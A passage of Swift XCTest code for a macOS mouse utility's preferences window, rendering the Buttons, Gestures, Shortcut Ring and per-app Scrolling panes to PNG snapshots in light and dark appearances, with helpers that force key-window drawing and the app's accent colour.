        appearance.performAsCurrentDrawingAppearance {
            NSColor.windowBackgroundColor.setFill()
            bounds.fill()
        }
        rep.draw(in: bounds)
        NSGraphicsContext.restoreGraphicsState()

        let png = try XCTUnwrap(canvas.representation(using: .png, properties: [:]))
        try png.write(to: url)
    }

    private func describe(_ color: NSColor?, in appearance: NSAppearance) -> String {
        guard let color else { return "nil" }
        var text = ""
        appearance.performAsCurrentDrawingAppearance {
            if let rgb = color.usingColorSpace(.sRGB) {
                text = String(format: "rgba(%.0f, %.0f, %.0f, %.2f)", rgb.redComponent * 255, rgb.greenComponent * 255, rgb.blueComponent * 255, rgb.alphaComponent)
            } else {
                text = "\(color)"
            }
        }
        return text
    }
}

/// Counts as the key and main window, so controls draw as in the window the user works in;
/// or, with `isKey` off, as a window behind another. AppKit draws its controls (switches,
/// sliders, segmented controls, a list's selection) in the accent colour only while their
/// window has the key appearance, which it otherwise gives a window only while the app is
/// active: the test host never is. `hasKeyAppearance` is what the controls ask (AppKit's
/// own method, not in the SDK's headers); answering it here draws them as in the front
/// window of the active app. Were it renamed, the controls would draw grey again, nothing
/// else.
private final class RenderWindow: NSWindow {
    var isKey = true
    override var isKeyWindow: Bool { return isKey }
    override var isMainWindow: Bool { return isKey }
    @objc(hasKeyAppearance) func renderHasKeyAppearance() -> Bool { return isKey }
}

/// How a picture with the pane's title is cut from the window's frame: the pane's column
/// from the top of the window (the title bar's strip, with the title) down to `margin`
/// below the `boxes`-th box of the pane counted from the top (a rounded box or a list, or
/// a view of one of the `alsoBoxes` classes), or to the bottom of the column when nil.
/// The line at the column's leading edge (the sidebar's border) is left out.
private struct TitledCut {
    var boxes: Int?
    var margin: CGFloat = 20
    /// Views that count as boxes too (the drawing of an app's own ring stands on its page
    /// by itself).
    var alsoBoxes: [AnyClass] = []

    func rect(column scroll: NSScrollView, pane: NSView, in frameView: NSView) -> NSRect {
        let column = scroll.convert(scroll.bounds, to: frameView)
        let flipped = frameView.isFlipped
        var bottom = flipped ? column.maxY : column.minY
        if let boxes, boxes > 0 {
            let frames = Self.boxes(in: pane, also: alsoBoxes).map { $0.convert($0.bounds, to: frameView) }
            let fromTop = flipped ? frames.sorted { $0.minY < $1.minY } : frames.sorted { $0.maxY > $1.maxY }
            if fromTop.count >= boxes {
                let box = fromTop[boxes - 1]
                bottom = flipped ? min(column.maxY, box.maxY + margin) : max(column.minY, box.minY - margin)
            }
        }
        let leading = column.minX + 1
        let top = flipped ? frameView.bounds.minY : frameView.bounds.maxY
        return NSRect(x: leading, y: min(top, bottom), width: column.maxX - leading, height: abs(top - bottom))
    }

    /// The pane's boxes, the outermost only.
    private static func boxes(in view: NSView, also: [AnyClass]) -> [NSView] {
        if view is PreferencesGroupBox || view is PreferencesListBox || also.contains(where: { view.isKind(of: $0) }) {
            return [view]
        }
        return view.subviews.flatMap { boxes(in: $0, also: also) }
    }
}

/// A pane with the kit's list, as the Buttons and Apps panes build theirs.
private final class ListRenderController: NSViewController {

    private let empty: Bool

    init(empty: Bool) {
        self.empty = empty
        super.init(nibName: nil, bundle: nil)
    }

    required init?(coder: NSCoder) {
        fatalError("built in code")
    }

    override func loadView() {
        let paneWidth = PreferencesWindowLayout.contentWidth
        let width = PreferencesGroupedForm.boxWidth(paneWidth: paneWidth)
        let root = PreferencesForm.makeBackground()
        let content = PreferencesGroupedForm.installContentStack(in: root, paneWidth: paneWidth)
        content.setHuggingPriority(.defaultHigh, for: .vertical)

        let list = PreferencesListBox(
            width: width,
            emptyTitle: "No buttons yet",
            emptyExplanation: "Click + and press a mouse button to give it an action."
        )
        let section: NSView
        if empty {
            section = list
        } else {
            let calculator = NSWorkspace.shared.icon(forFile: "/System/Applications/Calculator.app")
            let popUp = NSPopUpButton(frame: .zero, pullsDown: true)
            popUp.addItem(withTitle: "")
            popUp.addItems(withTitles: ["Copy", "Paste"])
            popUp.item(at: 0)?.title = "Mission Control"
            popUp.item(at: 0)?.image = NSImage(systemSymbolName: "rectangle.3.group", accessibilityDescription: nil)
            popUp.widthAnchor.constraint(equalToConstant: 240).isActive = true
            let selectedPopUp = NSPopUpButton(frame: .zero, pullsDown: true)
            selectedPopUp.addItem(withTitle: "Gesture Navigation")
            selectedPopUp.item(at: 0)?.image = NSImage(systemSymbolName: "hand.draw", accessibilityDescription: nil)
            selectedPopUp.widthAnchor.constraint(equalToConstant: 240).isActive = true
            let info = NSButton(image: NSImage(systemSymbolName: "info.circle", accessibilityDescription: nil)!, target: nil, action: nil)
            info.isBordered = false
            let accessory = NSStackView(views: [info, selectedPopUp])
            accessory.spacing = 8
            list.setRows([
                PreferencesListRow(id: "back", title: "⌥ Back button", explanation: "Hold and move the mouse. Set the directions under Gestures.",
                                   icon: .symbol("computermouse"), accessory: accessory, centeredOn: selectedPopUp, controls: [selectedPopUp]),
                PreferencesListRow(id: "forward", title: "Forward button", icon: .symbol("arrow.right.circle"), accessory: popUp),
                PreferencesListRow(id: "calculator", title: "Calculator", explanation: "Uses its own scrolling settings.",
                                   icon: .image(calculator), showsChevron: true),
                PreferencesListRow(id: "dimmed", title: "Button 6", explanation: "Choose what this button does.",
                                   icon: .symbol("questionmark.circle")),
            ])
            list.rows[3].isEnabled = false
            list.select("back")
            let spinner = NSProgressIndicator()
            spinner.style = .spinning
            spinner.controlSize = .small
            spinner.widthAnchor.constraint(equalToConstant: 12).isActive = true
            spinner.heightAnchor.constraint(equalToConstant: 12).isActive = true
            let checking = NSTextField(labelWithString: "Checking buttons…")
            checking.font = .systemFont(ofSize: NSFont.smallSystemFontSize)
            checking.textColor = .secondaryLabelColor
            let busy = NSStackView(views: [spinner, checking])
            busy.spacing = 6
            list.footerAccessory = busy
            section = PreferencesListSection(title: "Apps", list: list)
        }
        let switchBox = PreferencesGroupSection(width: width, rows: [
            PreferencesSwitchRow(title: "Change scrolling only in these apps", explanation: "Apps not in the list scroll the way macOS does.", target: nil, action: nil),
        ])
        PreferencesGroupedForm.add([switchBox, section], to: content)
        view = root
        root.setFrameSize(root.fittingSize)
    }
}

/// Makes `NSColor.controlAccentColor` return the app's own accent colour (the asset
/// catalog's `AccentColor`) for the pictures, whatever accent this Mac's user chose: macOS
/// gives an app its own accent only while the user's choice is "Multicolour", and the tests
/// do not change that setting. Only what asks for `controlAccentColor` follows: the app's
/// drawings do; colours AppKit works out by itself (a list's selection, the switches) do not.
/// Also used by WelcomeGuideRenderTests.
enum ForcedAppAccent {

    private static var original: IMP?
    private static let selector = #selector(getter: NSColor.controlAccentColor)

    static func install() throws {
        guard original == nil else { return }
        let accent = try XCTUnwrap(NSColor(named: AppAccent.assetName))
        let method = try XCTUnwrap(class_getClassMethod(NSColor.self, selector))
        let replacement: @convention(block) (AnyObject) -> NSColor = { _ in accent }
        original = method_setImplementation(method, imp_implementationWithBlock(replacement))
    }

    static func uninstall() {
        guard let original, let method = class_getClassMethod(NSColor.self, selector) else { return }
        method_setImplementation(method, original)
        self.original = nil
    }
}

/// An open menu, drawn in-process as a stand-in (`testRenderTriggerChoice`): a menu is a
/// window of its own, which the tests never open. The items' titles as the menu has them
/// (their attributed titles, in the menu font), the tick, section headers and separators,
/// on a plain rounded card (the real menu is a material).
private final class MenuStandInView: NSView {

    private let items: [NSMenuItem]
    private static let rowHeight: CGFloat = 22
    private static let separatorHeight: CGFloat = 11
    private static let inset: CGFloat = 5

    init(items: [NSMenuItem]) {
        self.items = items
        let height = items.reduce(2 * Self.inset) { $0 + ($1.isSeparatorItem ? Self.separatorHeight : Self.rowHeight) }
        let font = NSFont.menuFont(ofSize: 0)
        let width = items.map { item -> CGFloat in
            (item.attributedTitle?.size().width ?? (item.title as NSString).size(withAttributes: [.font: font]).width)
        }.max() ?? 100
        super.init(frame: NSRect(x: 0, y: 0, width: ceil(width) + 48, height: height))
    }

    required init?(coder: NSCoder) {
        fatalError("built in code")
    }

    override var isFlipped: Bool {
        return true
    }

    override func draw(_ dirtyRect: NSRect) {
        let card = NSBezierPath(roundedRect: bounds.insetBy(dx: 0.5, dy: 0.5), xRadius: 8, yRadius: 8)
        NSColor.controlBackgroundColor.setFill()
        card.fill()
        NSColor.separatorColor.setStroke()
        card.stroke()
        let font = NSFont.menuFont(ofSize: 0)
        var y = Self.inset
        for item in items {
            if item.isSeparatorItem {
                NSColor.separatorColor.setFill()
                NSRect(x: 12, y: y + 5, width: bounds.width - 24, height: 1).fill()
                y += Self.separatorHeight
                continue
            }
            if item.state == .on {
                ("✓" as NSString).draw(at: NSPoint(x: 9, y: y + 3), withAttributes: [.font: font, .foregroundColor: NSColor.labelColor])
            }
            let title: NSAttributedString
            if item.isSectionHeader {
                title = NSAttributedString(string: item.title, attributes: [
                    .font: NSFont.boldSystemFont(ofSize: NSFont.smallSystemFontSize), .foregroundColor: NSColor.secondaryLabelColor,
                ])
            } else {
                title = item.attributedTitle ?? NSAttributedString(string: item.title, attributes: [.font: font, .foregroundColor: NSColor.labelColor])
            }
            title.draw(at: NSPoint(x: 24, y: y + 3))
            y += Self.rowHeight
        }
    }
}

// MARK: - Round 2 B3

extension PreferencesWindowRenderTests {

    /// One vocabulary (round 2, proposal 22): an app's Gestures and Shortcut Ring parts in
    /// the pane's one column, for an app with a long name, with "Use settings from …" on
    /// and off, while a button of Buttons and one of the app's own both do it (the longest
    /// first line, "… as in other apps, … only in …")
    /// (`r2b3-app-<gestures|ring>-<inherit|own>-<appearance>.png`).
    func testRenderRound2B3AppPartWords() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        let savedGesture = Options.shared.gesture
        let savedBindings = Options.shared.buttons.binding
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            Options.shared.gesture = savedGesture
            Options.shared.buttons.binding = savedBindings
            ShortcutRingController.forgetPreparedFaces()
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        Options.shared.gesture = .default
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.mouseGestureNavigation.identifier),
            binding(4, SystemShortcut.shortcutRing.identifier),
        ]
        for own in [false, true] {
            let long = Application(path: "/Applications/Microsoft Visual Studio Code Insiders Edition With A Long Name.app")
            long.displayName = "Microsoft Visual Studio Code Insiders Edition"
            long.setOwnButtonBindings([
                binding(5, SystemShortcut.mouseGestureNavigation.identifier),
                binding(6, SystemShortcut.shortcutRing.identifier),
            ])
            if own {
                long.setUsesGeneralGestures(false, general: .default)
                long.setUsesGeneralRing(false, general: .default)
            }
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [long], matchKey: "path")
            for part in [ApplicationPagePart.gestures, .ring] {
                let defaults = uiDefaults(advanced: false)
                let name = "r2b3-app-\(part == .gestures ? "gestures" : "ring")-\(own ? "own" : "inherit")"
                try renderPane(PANEL_IDENTIFIER.application, name: name, prepare: { preferences in
                    (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                        .uiStateDefaults = defaults
                }, afterLoad: { controller in
                    (controller as? PreferencesApplicationViewController)?.openApplication(withID: long.path, part: part)
                })
            }
        }
    }
}

// MARK: - Round 2 B1

extension PreferencesWindowRenderTests {

    /// "Scrolling in Safari" (`r2-b1-<case>-<appearance>.png`), Safari's page on its
    /// Scrolling part: `same`, `own`, `macos` (the three choices); `own-limit` and
    /// `macos-limit` with "Change scrolling only in these apps" on (the line under the
    /// app's box, not with Left to macOS); `own-min` and `macos-min` in the smallest
    /// window; `long-name` and `long-name-own`, an app with a long name and the limit on.
    func testRenderRound2B1ScrollingChoice() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        let minimum = PreferencesWindowLayout.minimumContentHeight
        func page(
            _ name: String, _ choice: ApplicationScrollingChoice, limit: Bool = false,
            displayName: String? = nil, windowHeight: CGFloat? = nil
        ) throws {
            let safari = Application(path: "/Applications/Safari.app")
            safari.setUsesScrollingSettings(choice == .sameAsScrolling, scrolling: Options.shared.scroll, thumbWheel: Options.shared.thumbWheel)
            if choice == .leftToMacOS {
                safari.scroll.smooth = false
                safari.scroll.reversesWheel = false
            }
            if let displayName {
                safari.displayName = displayName
            }
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari], matchKey: "path")
            Options.shared.application.allowlist = limit
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: "r2-b1-\(name)", windowHeight: windowHeight, prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                (controller as? PreferencesApplicationViewController)?.openApplication(withID: safari.path, part: .scrolling)
            })
        }
        try page("same", .sameAsScrolling)
        try page("own", .ownSettings)
        try page("macos", .leftToMacOS)
        try page("own-limit", .ownSettings, limit: true)
        try page("macos-limit", .leftToMacOS, limit: true)
        try page("own-min", .ownSettings, limit: true, windowHeight: minimum)
        try page("macos-min", .leftToMacOS, windowHeight: minimum)
        let long = "An Application With A Remarkably Long Name For Its Kind"
        try page("long-name", .leftToMacOS, limit: true, displayName: long)
        try page("long-name-own", .ownSettings, limit: true, displayName: long)
    }
}

// MARK: - Round 2 B2

/// Round 2, proposal 23 and 22's words in an app's Buttons part (`round2-b2-*-<appearance>.png`):
/// "Default" on every row of Buttons, with what it then does in parentheses where that is
/// certain; an app's Buttons part with "In other apps: …" and its menus with "Same as
/// Other Apps (…)"; the trigger chooser's "Default (Back), will be replaced" and the
/// recorder's "Replaces: Copy".
extension PreferencesWindowRenderTests {

    private func round2Source(_ name: String?) -> ButtonsDeviceSource {
        return ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { name }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
    }

    private func round2Binding(
        _ code: UInt16, _ action: String = "", modifiers: CGEventFlags = [], type: Scrollio_Debug.EventType = .mouse
    ) -> ButtonBinding {
        let trigger = RecordedEvent(type: type, code: code, modifiers: UInt(modifiers.rawValue), deviceFilter: nil)
        return ButtonBinding(triggerEvent: trigger, systemShortcutName: action, isEnabled: !action.isEmpty)
    }

    private func round2Menu(_ items: [NSMenuItem], name: String) throws {
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            let sheet = MenuStandInView(items: items)
            sheet.appearance = appearance
            try write(sheet, appearance: appearance, to: directory.appendingPathComponent("\(name)-\(suffix).png"))
        }
    }

    /// What a pull-down's menu shows: its items without the title and the hidden separator.
    private func round2Shown(_ popUp: NSPopUpButton) throws -> [NSMenuItem] {
        return Array(try XCTUnwrap(popUp.menu).items.dropFirst().filter { !$0.isHidden })
    }

    /// Buttons: an MX Master 4 with nothing set up (and with its Back row selected: the
    /// card says what the row says), an MX Master 3S with a few bindings (its mode shift
    /// button kept by "⌥ Mode shift button": plain "Default"), and a generic mouse whose
    /// bindings include rows without an action (a button, one with ⌥, a numbered one, a
    /// key). "Default (Switch Wheel Mode)", the longest, fits the 240 pt pull-down.
    func testRenderRound2B2Buttons() throws {
        Options.shared.buttons.binding = []
        try renderButtons(name: "round2-b2-buttons-mx4", source: round2Source("MX Master 4")) { buttons in
            let modeShift = buttons.row(for: ButtonsMousePart.modeShift)?.pullDown
            XCTAssertEqual(modeShift?.menu?.items.first?.title, "Default (Switch Wheel Mode)")
            if let modeShift, let title = modeShift.menu?.items.first?.attributedTitle {
                let room = (modeShift.cell as? NSPopUpButtonCell)?.titleRect(forBounds: modeShift.bounds).width ?? 0
                XCTAssertGreaterThanOrEqual(room, ceil(title.size().width), "Default (Switch Wheel Mode) fits")
            }
        }
        try renderButtons(name: "round2-b2-buttons-mx4-back-selected", source: round2Source("MX Master 4")) { buttons in
            buttons.list.select(ButtonsMousePart.back)
        }
        Options.shared.buttons.binding = [
            round2Binding(3, SystemShortcut.copy.identifier),
            round2Binding(1001, SystemShortcut.missionControl.identifier, modifiers: .maskAlternate),
            round2Binding(7, SystemShortcut.paste.identifier),
        ]
        try renderButtons(name: "round2-b2-buttons-mx3s", source: round2Source("MX Master 3S"))
        Options.shared.buttons.binding = [
            round2Binding(3),
            round2Binding(4, SystemShortcut.missionControl.identifier),
            round2Binding(2),
            round2Binding(3, modifiers: .maskAlternate),
            round2Binding(6),
            round2Binding(40, modifiers: [.maskControl, .maskAlternate], type: .keyboard),
        ]
        try renderButtons(name: "round2-b2-buttons-generic", source: round2Source(nil))
        try renderButtons(name: "round2-b2-buttons-generic-back-selected", source: round2Source(nil)) { buttons in
            buttons.list.select(buttons.rowID(forBinding: Options.shared.buttons.binding[0].id))
        }

        // The Back row's menu on an MX Master 4: "Default (Back)" first.
        Options.shared.buttons.binding = []
        let buttons = PreferencesButtonsViewController()
        buttons.deviceSource = round2Source("MX Master 4")
        buttons.presentPlaceMenu = { _, _ in }
        _ = buttons.view
        let back = try XCTUnwrap(buttons.row(for: ButtonsMousePart.back))
        try round2Menu(try round2Shown(back.pullDown), name: "round2-b2-menu-buttons-back")
    }

    /// Safari's Buttons part with its own rows (Forward with an action of its own, Back on
    /// "Default", the thumb wheel's function) on an MX Master 4, one row selected, and the
    /// menus of a row and of the thumb wheel's row, each starting with "Same as Other Apps".
    func testRenderRound2B2AppButtons() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock {
            Options.shared.application.applications = stored
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.buttons.binding = [round2Binding(4, SystemShortcut.missionControl.identifier)]
        let safari = Application(path: "/Applications/Safari.app")
        safari.setOwnButtonBindings([
            round2Binding(4, SystemShortcut.copy.identifier), round2Binding(3), round2Binding(2),
            round2Binding(LogiCenter.shared.scrollioCode(for: .modeShift)),
        ])
        safari.setOwnThumbWheelFunction(.zoom)
        // (An app's own "Default" is stored as an enabled binding without an action.)
        safari.setOwnButtonBindings(safari.ownButtonBindings.map {
            ButtonBinding(id: $0.id, triggerEvent: $0.triggerEvent, systemShortcutName: $0.systemShortcutName, isEnabled: true, createdAt: $0.createdAt)
        })
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari], matchKey: "path")
        let defaults = uiDefaults(advanced: false)
        var part: ApplicationButtonsViewController?
        for selected in [false, true] {
            try renderPane(PANEL_IDENTIFIER.application, name: "round2-b2-app-buttons" + (selected ? "-selected" : ""), prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                let apps = controller as? PreferencesApplicationViewController
                apps?.openApplication(withID: safari.path, part: .buttons)
                part = apps?.detailController?.buttonsPart
                part?.deviceSource = self.round2Source("MX Master 4")
                part?.reloadRows()
                if selected, let id = part?.rows.last?.id {
                    part?.list.select(id)
                }
            })
        }
        let shown = try XCTUnwrap(part)
        let forward = try XCTUnwrap(shown.rows.first)
        try round2Menu(try round2Shown(forward.pullDown), name: "round2-b2-menu-app-row")
        let wheel = try XCTUnwrap(shown.thumbWheelRow)
        try round2Menu(try round2Shown(wheel.pullDown), name: "round2-b2-menu-app-thumb-wheel")
    }

    /// The trigger chooser of Gestures on an MX Master 3S (Back has Copy, the gesture
    /// button runs the gestures): what each button does, "Default (Forward), will be
    /// replaced"; and the recorder's popover after "Record a Button…" caught Back:
    /// "Replaces: Copy" under it.
    func testRenderRound2B2TriggerChoiceAndRecorder() throws {
        let gestures = SystemShortcut.mouseGestureNavigation.identifier
        Options.shared.buttons.binding = [
            round2Binding(3, SystemShortcut.copy.identifier), round2Binding(LogiCenter.shared.scrollioCode(for: .gesture), gestures),
        ]
        Options.shared.gesture = .default
        let pane = GesturesPreferencesViewController(isInteractiveAvailable: { true })
        pane.deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
        _ = pane.view
        let chooser: TriggerChooser = try XCTUnwrap(pane.triggerChooser)
        chooser.deviceSource = round2Source("MX Master 3S")
        chooser.update(triggerTitles: chooser.triggerTitles)
        try round2Menu(Array(try XCTUnwrap(chooser.pullDown.menu).items.dropFirst()), name: "round2-b2-menu-trigger-choice")

        let note = try XCTUnwrap(chooser.replacedNote(for: RecordedEvent(type: .mouse, code: 3, modifiers: 0, deviceFilter: nil)))
        XCTAssertEqual(note, "Replaces: Copy")
        let popover = KeyPopover()
        popover.announce = { _ in }
        popover.testingPrepareContent(waitingHint: NSLocalizedString("buttons-recorder-waiting-gesture", comment: ""))
        popover.keyPreview.update(from: ["Back button"], status: .recorded)
        popover.showRecordedNote(note)
        let view = try XCTUnwrap(popover.testingContentView)
        view.layoutSubtreeIfNeeded()
        view.setFrameSize(view.fittingSize)
        try renderInPopoverMaterial(view, name: "round2-b2-recorder-replaces")
        popover.hide()
    }
}

// MARK: - Round 2 fix Y

/// Round 2 fix Y (`round2-fix-y-*-<appearance>.png`): "Default" only where a press passes
/// through, "No Action" with why elsewhere (Y1); a Logitech key of While you hold a key
/// keeps its button (Y2); a key's row (Y5); an app's Buttons part with "In other apps: …"
/// by the same rule (Y1, Y3, Y4) and its thumb wheel's line (Y6); the trigger chooser and
/// the recorder's note (Y1, Y2).
extension PreferencesWindowRenderTests {

    /// Buttons on an MX Master 4: Back runs Mission Control, ⌥ Back has none (a press runs
    /// Mission Control), ⌃ Gesture runs Copy (the gesture button's row and ⌥ Gesture: a
    /// press does nothing), a key without an action, and Forward a Logitech key of While you
    /// hold a key. Then with ⌥ Back's row selected (the card says what the row says).
    func testRenderRound2FixYButtons() throws {
        let gesture = LogiCenter.shared.scrollioCode(for: .gesture)
        let forward = LogiCenter.shared.scrollioCode(for: .forward)
        Options.shared.buttons.binding = [
            round2Binding(3, SystemShortcut.missionControl.identifier),
            round2Binding(3, modifiers: .maskAlternate),
            round2Binding(gesture, SystemShortcut.copy.identifier, modifiers: .maskControl),
            round2Binding(gesture, modifiers: .maskAlternate),
            round2Binding(40, modifiers: [.maskControl, .maskAlternate], type: .keyboard),
        ]
        let keys = [ScrollHotkey(type: .mouse, code: forward)]
        let optionBack = Options.shared.buttons.binding[1].id
        for selected in [false, true] {
            try renderButtons(
                name: "round2-fix-y-buttons" + (selected ? "-option-back-selected" : ""),
                source: round2Source("MX Master 4"), scrollKeys: keys
            ) { buttons in
                buttons.holdKeysThatCatch = { keys }
                buttons.reload()
                XCTAssertEqual(buttons.row(for: optionBack)?.explanation, "A press runs Mission Control.")
                XCTAssertEqual(buttons.row(for: ButtonsMousePart.gesture)?.pullDown.menu?.items.first?.title, "No Action")
                XCTAssertEqual(buttons.row(for: ButtonsMousePart.forward)?.pullDown.menu?.items.first?.title, "No Action")
                if selected {
                    buttons.list.select(buttons.rowID(forBinding: optionBack))
                }
            }
        }
    }

    /// Safari's Buttons part on an MX Master 4: ⌥ Back of its own (in other apps ⌥ Back
    /// runs Back's Mission Control), ⌥ Gesture (in other apps caught for ⌃ Gesture: "No
    /// Action"), its own "Default" on the standard Forward while the Logitech one is caught
    /// for ⌥ Forward ("No Action": the press never reaches it), and the thumb wheel's
    /// function ("In other apps: Default (Scroll Sideways)"); and a row's menu.
    func testRenderRound2FixYAppButtons() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock {
            Options.shared.application.applications = stored
            ButtonUtils.shared.invalidateCache()
        }
        let gesture = LogiCenter.shared.scrollioCode(for: .gesture)
        let forward = LogiCenter.shared.scrollioCode(for: .forward)
        Options.shared.buttons.binding = [
            round2Binding(3, SystemShortcut.missionControl.identifier),
            round2Binding(3, modifiers: .maskAlternate),
            round2Binding(gesture, SystemShortcut.paste.identifier, modifiers: .maskControl),
            round2Binding(forward, SystemShortcut.copy.identifier, modifiers: .maskAlternate),
        ]
        let safari = Application(path: "/Applications/Safari.app")
        safari.setOwnButtonBindings([
            round2Binding(3, SystemShortcut.copy.identifier, modifiers: .maskAlternate),
            round2Binding(gesture, SystemShortcut.copy.identifier, modifiers: .maskAlternate),
            ButtonBinding(
                triggerEvent: RecordedEvent(type: .mouse, code: 4, modifiers: 0, deviceFilter: nil), systemShortcutName: "", isEnabled: true
            ),
        ])
        safari.setOwnThumbWheelFunction(.zoom)
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari], matchKey: "path")
        let defaults = uiDefaults(advanced: false)
        var part: ApplicationButtonsViewController?
        try renderPane(PANEL_IDENTIFIER.application, name: "round2-fix-y-app-buttons", prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = defaults
        }, afterLoad: { controller in
            let apps = controller as? PreferencesApplicationViewController
            apps?.openApplication(withID: safari.path, part: .buttons)
            part = apps?.detailController?.buttonsPart
            part?.deviceSource = self.round2Source("MX Master 4")
            part?.holdKeysThatCatch = { [] }
            part?.reloadRows()
        })
        let shown = try XCTUnwrap(part)
        XCTAssertEqual(shown.rows.map(\.explanation), [
            "In other apps: Mission Control", "In other apps: No\u{A0}Action", "In other apps: No\u{A0}Action",
        ])
        XCTAssertEqual(shown.rows.last?.pullDown.menu?.items.first?.title, "No Action")
        XCTAssertEqual(shown.thumbWheelRow?.explanation, "In other apps: Default\u{A0}(Scroll\u{A0}Sideways)")
        try round2Menu(try round2Shown(try XCTUnwrap(shown.rows.first).pullDown), name: "round2-fix-y-menu-app-row")
    }

    /// The Gestures pane's trigger chooser on an MX Master 3S: Back runs the gestures,
    /// ⌃ Gesture runs Copy (the gesture button: "No Action", nothing replaced), Forward is a
    /// Logitech key of While you hold a key ("No Action"); and the recorder's note for ⌥
    /// Back while Back runs Mission Control in the ring's chooser: "Replaces: Mission
    /// Control".
    func testRenderRound2FixYTriggerChoice() throws {
        let gesture = LogiCenter.shared.scrollioCode(for: .gesture)
        let forward = LogiCenter.shared.scrollioCode(for: .forward)
        Options.shared.buttons.binding = [
            round2Binding(3, SystemShortcut.mouseGestureNavigation.identifier),
            round2Binding(gesture, SystemShortcut.copy.identifier, modifiers: .maskControl),
        ]
        Options.shared.gesture = .default
        let pane = GesturesPreferencesViewController(isInteractiveAvailable: { true })
        pane.deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
        _ = pane.view
        let chooser: TriggerChooser = try XCTUnwrap(pane.triggerChooser)
        chooser.deviceSource = round2Source("MX Master 3S")
        chooser.holdKeys = { [ScrollHotkey(type: .mouse, code: forward)] }
        chooser.update(triggerTitles: chooser.triggerTitles)
        try round2Menu(Array(try XCTUnwrap(chooser.pullDown.menu).items.dropFirst()), name: "round2-fix-y-menu-trigger-choice")

        Options.shared.buttons.binding = [round2Binding(3, SystemShortcut.missionControl.identifier)]
        let ring = TriggerChooser(rule: .shortcutRing)
        ring.deviceSource = round2Source("MX Master 3S")
        ring.holdKeys = { [] }
        let note = try XCTUnwrap(ring.replacedNote(for: RecordedEvent(
            type: .mouse, code: 3, modifiers: UInt(CGEventFlags.maskAlternate.rawValue), deviceFilter: nil
        )))
        XCTAssertEqual(note, "Replaces: Mission Control")
        let popover = KeyPopover()
        popover.announce = { _ in }
        popover.testingPrepareContent(waitingHint: NSLocalizedString("buttons-recorder-waiting-gesture", comment: ""))
        popover.keyPreview.update(from: ["⌥", "Back button"], status: .recorded)
        popover.showRecordedNote(note)
        let view = try XCTUnwrap(popover.testingContentView)
        view.layoutSubtreeIfNeeded()
        view.setFrameSize(view.fittingSize)
        try renderInPopoverMaterial(view, name: "round2-fix-y-recorder-replaces")
        popover.hide()
    }
}

// MARK: - Round 2 fix X

extension PreferencesWindowRenderTests {

    /// What the round 2 fixes X change (`r2-fix-x-<case>-<appearance>.png`), an app's page:
    /// `macos`, Left to macOS: the Thumb wheel box alone, without Speed while it scrolls
    /// sideways; `macos-tabs`, the same with Switch Tabs, Speed there; `limit-picked-macos`,
    /// the limit on, the page opened on Own Settings and Left to macOS picked: the line above
    /// the parts faded out, its room kept; `limit-cjk`, an app named 微信 with the limit on:
    /// its name whole in the line; `ring-long-mixed`, an app with a 45-character name whose
    /// ring opens with a button as in other apps and two of its own: the first row's line
    /// cut to two lines, with its semicolon.
    func testRenderRound2FixX() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        func page(
            _ name: String, part: ApplicationPagePart = .scrolling, limit: Bool = false,
            app make: @escaping () -> Application, after: ((ApplicationDetailViewController) -> Void)? = nil
        ) throws {
            Options.shared.application.allowlist = limit
            let defaults = uiDefaults(advanced: false)
            var path = ""
            try renderPane(PANEL_IDENTIFIER.application, name: "r2-fix-x-\(name)", prepare: { preferences in
                // A new entry for each appearance: a pick changes it.
                let app = make()
                path = app.path
                Options.shared.application.applications = EnhanceArray<Application>(withArray: [app], matchKey: "path")
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                let pane = controller as? PreferencesApplicationViewController
                pane?.openApplication(withID: path, part: part)
                if let page = pane?.detailController {
                    after?(page)
                }
            })
        }
        func safari(_ choice: ApplicationScrollingChoice, function: ThumbWheelFunction? = nil) -> Application {
            let safari = Application(path: "/Applications/Safari.app")
            safari.setUsesScrollingSettings(choice == .sameAsScrolling, scrolling: Options.shared.scroll, thumbWheel: Options.shared.thumbWheel)
            if choice == .leftToMacOS {
                safari.scroll.smooth = false
                safari.scroll.reversesWheel = false
            }
            safari.setOwnThumbWheelFunction(function)
            return safari
        }
        try page("macos", app: { safari(.leftToMacOS) })
        try page("macos-tabs", app: { safari(.leftToMacOS, function: .tabs) })
        try page("limit-picked-macos", limit: true, app: { safari(.ownSettings) }) { page in
            page.scrollingChoicePopUp.selectItem(withTag: ApplicationScrollingChoice.leftToMacOS.rawValue)
            page.scrollingPart.choiceChanged(page.scrollingChoicePopUp)
        }
        try page("limit-cjk", limit: true, app: {
            let weChat = Application(path: "/Applications/WeChat.app")
            weChat.displayName = "微信"
